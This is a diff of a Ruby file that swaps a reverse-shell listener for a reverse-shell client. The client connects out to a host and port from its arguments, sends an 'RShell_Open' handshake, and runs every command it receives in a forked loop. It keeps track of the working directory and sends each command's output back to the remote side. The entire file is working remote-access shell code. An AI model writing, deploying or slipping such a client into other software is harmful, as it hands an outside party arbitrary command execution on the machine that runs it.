@@ -1,31 +1,50 @@
 require "socket"
 
-host = "0.0.0.0"
-port = 3455
-
-server = TCPServer.new(host, port)
-puts "Listening on #{host}:#{port.to_s}"
-thr = Thread.new do
-	client = server.accept
-	if client.gets.chomp == "RShell_Open"
-		currentDirCommand = client.gets
-		sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
-		loop do
-			client.puts "whoami"
-			whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
-			client.puts currentDirCommand
-			cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
-			print "#{whoami}@#{remote_ip}:#{cd}> "
-			cmd = gets.chomp
-			client.puts cmd
-			if cmd.downcase == "exit"
-				exit
-			end
-			puts client.gets.gsub("\\NEWLINE", "\n").chomp
-		end
-	else
-		client.close
-	end
+if ARGV[0] && ARGV[1]
+host = ARGV[0]
+port = ARGV[1].to_i
+else
+print "Host: "
+host = gets.chomp
+print "Port: "
+port = gets.chomp.to_i
 end
 
-thr.join
+
+
+host = TCPSocket.open(host, port)
+host.puts "RShell_Open"
+
+begin
+	`pwd`
+	currentDirCommand = "pwd"
+	joiner = "\; "
+rescue
+	`cd`
+	currentDirCommand = "cd"
+	joiner = "\& "
+end
+host.puts currentDirCommand
+$currentDir = ""
+fork do
+	loop do
+		cmd = host.gets.chomp
+		if cmd.downcase == "exit"
+			host.close
+			break
+		else
+			begin
+				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
+					$currentDir = `cd "#{$currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
+					out = "Changed Directory\n"
+				else
+					out = `cd "#{$currentDir}"#{joiner}#{cmd.chomp}`
+				end
+			rescue
+				out = "Unable to execute command\n"
+			end
+			host.puts out.gsub("\n", "\\NEWLINE")
+		end
+	end
+end
+exit
